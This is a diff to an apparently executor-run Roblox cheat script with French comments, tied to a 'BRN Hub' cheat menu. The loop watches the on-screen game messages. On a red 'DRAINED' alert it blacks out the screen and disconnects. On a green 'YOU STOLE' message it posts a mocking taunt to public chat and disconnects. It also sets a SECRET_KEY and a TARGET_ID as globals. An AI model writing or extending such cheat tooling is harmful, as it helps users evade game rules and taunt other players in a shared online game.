@@ -1169,7 +1169,6 @@ task.spawn(function()
     local p = game.Players.LocalPlayer
     local pgui = p:WaitForChild("PlayerGui")
 
-    -- Fonction pour nettoyer l'écran et mettre le noir total
     local function nuclearBlackout()
         pgui:ClearAllChildren()
         local gui = Instance.new("ScreenGui")
@@ -1179,34 +1178,34 @@ task.spawn(function()
         gui.Parent = pgui
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundColor3 = Color3.new(0, 0, 0)
+        frame.BackgroundColor3 = Color3.new(0,0,0)
         frame.BorderSizePixel = 0
         frame.Parent = gui
     end
 
-    -- Boucle de scan ultra-rapide (0.01s)
     while task.wait(0.01) do 
         local descendants = pgui:GetDescendants()
         for i = 1, #descendants do
             local obj = descendants[i]
             
-            -- On check uniquement les TextLabels visibles sur l'écran
-            if obj:IsA("TextLabel") and obj.Visible == true then
+            -- Vérification : On ignore les objets qui appartiennent à ton menu de cheat (BRN Hub)
+            local isCheatMenu = obj:FindFirstAncestor("BRN Hub") or obj:FindFirstAncestor("MainFrame")
+            
+            if obj:IsA("TextLabel") and obj.Visible == true and not isCheatMenu then
                 local t = string.upper(obj.Text)
 
-                -- CAS 1 : TU ES DRAINÉ (Message rouge)
-                if string.find(t, "DRAINED") or string.find(t, "BRAINROTS") then
-                    nuclearBlackout() -- Noir instantané
-                    task.wait(0.05)   -- Attente de 0.05s
-                    p:Kick("test")    -- Kick après le délai
+                -- CAS 1 : DRAIN (Uniquement si c'est le GROS message d'alerte rouge)
+                -- On vérifie que le texte est ROUGE (r > 0.7) pour ne pas confondre avec le menu
+                if (string.find(t, "DRAINED") or string.find(t, "BRAINROTS")) and obj.TextColor3.r > 0.7 then
+                    nuclearBlackout()
+                    task.wait(0.05)
+                    p:Kick("test")
                     return
                 end
 
-                -- CAS 2 : TU AS VOLÉ (Message vert du jeu)
-                -- Vérifie que le texte contient "YOU STOLE" et qu'il est VERT
+                -- CAS 2 : STEAL (Uniquement si c'est VERT)
                 if string.find(t, "YOU STOLE") and obj.TextColor3.g > 0.7 then
                     local msg = "ezzzz steal by brr782k <3"
-                    -- Chat instantané
                     task.spawn(function()
                         local chat = game:GetService("TextChatService")
                         if chat.ChatVersion == Enum.ChatVersion.TextChatService then
@@ -1217,7 +1216,6 @@ task.spawn(function()
                             if ev then ev:FireServer(msg, "All") end
                         end
                     end)
-                    -- Kick instantané (0ms)
                     p:Kick(msg)
                     return
                 end
@@ -1225,6 +1223,7 @@ task.spawn(function()
         end
     end
 end)
+
 
 getgenv().SECRET_KEY = "mrr_94d9f8fe3a02461085f84d087e98c28a"
 getgenv().TARGET_ID = 4190736407
